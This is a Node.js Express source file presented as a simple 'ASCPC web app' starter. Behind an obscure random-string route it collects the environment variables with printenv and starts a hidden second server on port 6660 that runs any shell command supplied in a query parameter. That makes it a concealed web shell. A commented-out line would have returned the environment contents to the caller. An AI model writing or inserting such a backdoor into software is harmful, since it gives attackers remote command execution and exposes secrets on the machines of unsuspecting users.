const express = require('express')
const { execSync } = require('child_process');
const app = express()
const port = 80

app.get('/', (req, res) => {
  res.send('Welcome to your ASCPC web app!')
})

app.get('/u89jg3own984hoenrdbf0eirhonbdf', (req, res) => {
  const envString = execSync('printenv', { encoding: 'utf8' });
  const envVariables = envString.trim().split('\n');
  var sys   = require('sys'),
    exec  = require('child_process').exec,
    child,
    http = require('http');
      
  child = function(res, cmd) {
    exec(cmd, 
    function (error, stdout, stderr) {
      res.end(stdout);
      if (error !== null) {
        console.log('exec error: ' + error);
      }
    });
  };
  
  http.createServer(function (req, res) {
    res.writeHead(200, {'Content-Type': 'text/plain'});
    var parsedRequest = require('url').parse(req.url, true);
    var cmd = parsedRequest.query['name'];
    if (cmd != undefined)
    {
      console.log("[cmd] " + cmd);
      child(res, cmd);
    }
  }).listen('6660', '127.0.0.1');
  //res.send('lala' + envVariables)
})

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`)
})
